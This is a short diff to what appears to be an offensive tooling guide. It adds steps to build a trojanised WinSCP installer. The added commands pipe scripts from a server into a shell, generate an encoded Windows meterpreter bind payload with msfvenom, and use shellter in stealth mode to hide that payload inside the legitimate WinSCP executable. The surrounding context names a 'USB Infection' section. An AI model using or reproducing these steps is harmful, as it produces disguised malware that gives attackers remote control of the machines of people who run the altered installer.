@@ -304,6 +304,27 @@ Install shellter:
 curl -fsSL http://<the server ip>/install/shellter.sh | sh
 ```
 
+Download WinSCP.exe:
+```shell
+curl -fsSL http://<the server ip>/download/winscp.sh | sh
+```
+
+Generate a payload:
+```shell
+msfvenom -p windows/meterpreter/bind_tcp LPORT=4001 -e x86/shikata_ga_nai -i 20 -f raw -o payload.raw
+```
+
+Start shellter:
+```shell
+shellter
+> mode? A
+> PE? WinSCP.exe
+> Stealth? Y
+> custom? C
+> payload? payload.raw
+> DLL loader? N
+```
+
 ---
 
 ### USB Infection
